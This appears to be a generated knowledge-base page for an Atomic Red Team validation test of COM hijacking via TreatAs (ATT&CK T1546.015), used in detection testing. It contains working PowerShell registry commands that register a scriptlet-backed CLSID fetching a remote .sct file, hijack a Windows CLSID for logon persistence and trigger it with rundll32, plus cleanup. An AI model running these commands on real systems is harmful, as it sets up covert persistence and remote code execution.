---
atomic_guid: "33eacead-f117-4863-8eb0-5c6304fbfaa9"
title: "COM hijacking via TreatAs"
framework: "atomic"
generated: "true"
attack_technique_id: "T1546.015"
attack_technique_name: "Event Triggered Execution: Component Object Model Hijacking"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.015/T1546.015.yaml"
build_date: "2026-04-26 17:02:13"
executor: "powershell"
aliases:
  - "33eacead-f117-4863-8eb0-5c6304fbfaa9"
  - "COM hijacking via TreatAs"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# COM hijacking via TreatAs

This test first create a custom CLSID class pointing to the Windows Script Component runtime DLL. This DLL looks for the ScriptletURL key to get the location of the script to execute.
Then, it hijacks the CLSID for the Work Folders Logon Synchronization to establish persistence on user logon by creating the 'TreatAs' with the malicious CLSID as default value. The
test is validated by running 'rundll32.exe -sta "AtomicTest"' to avoid logging out.

References:

https://youtu.be/3gz1QmiMhss?t=1251

https://github.com/enigma0x3/windows-operating-system-archaeology

## Metadata

- Atomic GUID: 33eacead-f117-4863-8eb0-5c6304fbfaa9
- Technique: T1546.015: Event Triggered Execution: Component Object Model Hijacking
- Platforms: windows
- Executor: powershell
- Source Path: atomics/T1546.015/T1546.015.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1546-event_triggered_execution|T1546.015]]

## Executor

- name: powershell

### Command

```powershell
reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest" /ve /T REG_SZ /d "AtomicTest" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest.1.00" /ve /T REG_SZ /d "AtomicTest" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest\CLSID" /ve /T REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest.1.00\CLSID" /ve /T REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /T REG_SZ /d "AtomicTest" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /T REG_SZ /d "C:\WINDOWS\system32\scrobj.dll" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /T REG_SZ /d "Apartment" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ProgID" /ve /T REG_SZ /d "AtomicTest" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /T REG_SZ /d "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/src/TreatAs.sct" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\VersionIndependentProgID" /ve /T REG_SZ /d "AtomicTest" /f

reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /T REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f

rundll32.exe -sta "AtomicTest"
```

### Cleanup

```powershell
reg delete "HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}" /f
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.015/T1546.015.yaml)
